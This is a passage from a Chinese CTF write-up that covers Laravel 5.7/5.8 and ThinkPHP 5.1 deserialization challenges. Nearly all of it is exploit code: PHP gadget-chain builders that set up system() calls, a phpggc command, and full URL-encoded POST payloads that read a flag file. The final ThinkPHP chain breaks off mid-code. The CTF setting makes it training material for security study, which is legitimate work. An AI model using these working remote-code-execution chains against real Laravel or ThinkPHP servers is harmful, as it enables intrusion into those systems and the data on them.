punctuation">(</span>        <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"Illuminate\Contracts\Console\Kernel"</span><span class="token operator">=></span>                <span class="token keyword">array</span><span class="token punctuation">(</span>                    <span class="token string double-quoted-string">"concrete"</span><span class="token operator">=></span><span class="token string double-quoted-string">"Illuminate\Foundation\Application"</span>                     <span class="token punctuation">)</span>             <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingcommand</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing<span class="token punctuation">\</span>PendingCommand</span><span class="token punctuation">(</span>        <span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /fl*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token variable">$genericuser</span><span class="token punctuation">,</span>        <span class="token variable">$application</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingcommand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>或者使用phpgcc<code>php  phpggc Laravel/RCE6 &quot;system(&#39;cat /flag&#39;);&quot; --url</code></p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> data<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A44<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CTesting<span class="token operator">%</span><span class="token number">5</span>CPendingCommand<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>command<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A13<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>parameters<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>tac<span class="token operator">+</span><span class="token operator">%</span><span class="token number">2</span>Ffl<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>app<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A33<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CApplication<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A22<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>hasBeenBootstrapped<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>bindings<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CContracts<span class="token operator">%</span><span class="token number">5</span>CConsole<span class="token operator">%</span><span class="token number">5</span>CKernel<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>concrete<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A33<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CApplication<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>test<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A27<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CAuth<span class="token operator">%</span><span class="token number">5</span>CGenericUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A13<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>attributes<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>expectedOutput<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">221</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A17<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>expectedQuestions<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">221</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web272-273-Laravel5-8-反序列化漏洞"><a href="#web272-273-Laravel5-8-反序列化漏洞" class="headerlink" title="web272-273(Laravel5.8 反序列化漏洞)"></a>web272-273(Laravel5.8 反序列化漏洞)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">PhpParser<span class="token punctuation">\</span>Node<span class="token punctuation">\</span>Scalar<span class="token punctuation">\</span>MagicConst</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Line</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Generator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockDefinition</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Loader</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">EvalLoader</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Dispatcher</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$queueResolver</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">queueResolver</span> <span class="token operator">=</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Console</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">QueuedCommand</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$connection</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">connection</span> <span class="token operator">=</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$events</span><span class="token punctuation">,</span> <span class="token variable">$event</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span> <span class="token operator">=</span> <span class="token variable">$events</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span> <span class="token operator">=</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">PhpParser<span class="token punctuation">\</span>Node<span class="token punctuation">\</span>Scalar<span class="token punctuation">\</span>MagicConst<span class="token punctuation">\</span>Line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mockdefinition</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Mockery<span class="token punctuation">\</span>Generator<span class="token punctuation">\</span>MockDefinition</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php system('cat /f*');exit;?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$evalloader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Mockery<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>EvalLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dispatcher</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Bus<span class="token punctuation">\</span>Dispatcher</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$evalloader</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$queuedcommand</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Console<span class="token punctuation">\</span>QueuedCommand</span><span class="token punctuation">(</span><span class="token variable">$mockdefinition</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingbroadcast</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$dispatcher</span><span class="token punctuation">,</span><span class="token variable">$queuedcommand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingbroadcast</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>或者使用phpgcc</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> data<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A29<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CSupport<span class="token operator">%</span><span class="token number">5</span>CMessageBag<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>messages<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>format<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A40<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBroadcasting<span class="token operator">%</span><span class="token number">5</span>CPendingBroadcast<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>events<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBus<span class="token operator">%</span><span class="token number">5</span>CDispatcher<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A16<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>queueResolver<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CLoader<span class="token operator">%</span><span class="token number">5</span>CEvalLoader<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">7</span>Di<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>load<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>event<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A38<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBroadcasting<span class="token operator">%</span><span class="token number">5</span>CBroadcastEvent<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>connection<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A32<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CGenerator<span class="token operator">%</span><span class="token number">5</span>CMockDefinition<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>config<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CGenerator<span class="token operator">%</span><span class="token number">5</span>CMockConfiguration<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>abcdefg<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">%</span><span class="token number">20</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span>cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">2</span>Fflag<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>exit<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web274-Thinkphp5-1反序列化漏洞"><a href="#web274-Thinkphp5-1反序列化漏洞" class="headerlink" title="web274(Thinkphp5.1反序列化漏洞)"></a>web274(Thinkphp5.1反序列化漏洞)</h4><p><a href="https://blog.csdn.net/rfrder/article/details/113843768">Thinkphp5.1 反序列化漏洞复现</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"lin"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"calc.exe"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"calc"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"lin"</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span> <span class="token comment">//PHP函数</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment">// 表单ajax伪装变量</span>        <span class="token string single-quoted-string">'var_ajax'</span>         <span class="token operator">=></span> <span class="token string single-quoted-string">'_ajax'</span><span class="token punctuation">,</span>      <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"var_ajax"</span><span class="token operator">=></span><span class="token string single-quoted-string">'lin'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//PHP函数的参数</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"visible"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Conversion</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token 